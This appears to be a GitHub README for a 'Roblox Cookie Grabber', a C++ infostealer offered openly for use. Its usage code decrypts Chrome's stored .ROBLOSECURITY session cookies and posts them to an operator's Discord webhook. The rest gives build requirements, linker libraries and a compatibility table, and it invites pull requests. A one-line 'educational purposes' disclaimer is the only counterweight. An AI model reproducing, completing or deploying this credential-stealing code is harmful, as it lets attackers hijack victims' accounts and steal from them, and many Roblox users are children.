# 🟩 Roblox Cookie Grabber 🟩 <a href="https://github.com/yurtrimu/roblox-cookie-grabber/actions/workflows/main.yml"><img src="https://github.com/yurtrimu/roblox-cookie-grabber/actions/workflows/main.yml/badge.svg?branch=main" alt="Working"></a>

## **Retrieval and decryption of the roblox's .ROBLOSECURITY cookies from chromium browsers. Based on chromium-stealer project.**

# Questions?
### - **I gladly answer your questions on the [discord server](https://discord.gg/QBhFd2aK4r).**

## Usage

```cpp
#include "webhook.hpp"
#include "cookiestealer.hpp"

std::string webhook_url = "YOUR WEBHOOK";

int main()
{

    if (!utils::console::is_windows()) { printf("The operating system has to be Windows NT\n"); exit(EXIT_FAILURE); }

    if (!utils::console::set_utf8()) { printf("Couldn't set console IO to utf8 encoding.\nConsole IO could show gibberish texts.\n"); }

    std::string Local_State_Path = "Google\\Chrome\\User Data\\Local State";
    std::string Database_Path = "Google\\Chrome\\User Data\\Default";

    CookieStealer stealer(Local_State_Path, Database_Path);
    stealer.initialize();

    std::stringstream ss; ss << "## **Roblox Cookies**\n"; ss << "-# .ROBLOSECURITY\n";

    for (const std::string &data : stealer.get_roblox()) {
        ss << "```" << data << "```\n";
    }

    curl_global_init(CURL_GLOBAL_ALL);

    struct discord_webhook webhook;
    webhook.avatar = "https://cdn.discordapp.com/avatars/607980985388105739/a_242b16cd46d4a14361822aa0b878e365.png";
    webhook.name = "Beamed by YURTRIMU";
    webhook.url = webhook_url;
    webhook.message = ss.str();

    std::string response;
    if (send_webhook(webhook, response)) { printf("Webhook successfully sent %zu length of data.\n", webhook.message.length()); }

    curl_global_cleanup();
}
```

## Operating System
- **Below Windows 7 - 🟦 Untested**
- **Windows 7 - 🟦 Untested**
- **Windows 10 - 🟩 Working**
- **Windows 11 - 🟦 Untested**
- **Mac OS - 🟥 Not Working**
- **Linux - 🟥 Not Working**

## Requirements

**You need to have the OpenSSL library installed and linked to your compiler.**

- You could download the OpenSSL library from [OpenSSL website](https://www.openssl.org/source/).

**You need to have the CURL library installed and linked to your compiler ( _ STATIC _).**

- You could download the CURL library from [CURL website](https://curl.se/download.html).

## Linker
- **libcrypto.lib**
- **libssl.lib**
- **libcurl_a.lib**
- **crypt32.lib**
- **ws2_32.lib**
- **wldap32.lib**
- **normaliz.lib**

## Compiling

- **Build - 🟦 Untested**
- **Release - 🟩 Working**
- **C++17 or below - 🟦 Untested**
- **C++20 - 🟩 Working**

## Contributing

**Pull requests are welcome.**

## Legal Disclaimer
🟥 **The content provided is for educational and informational purposes only.** 🟥
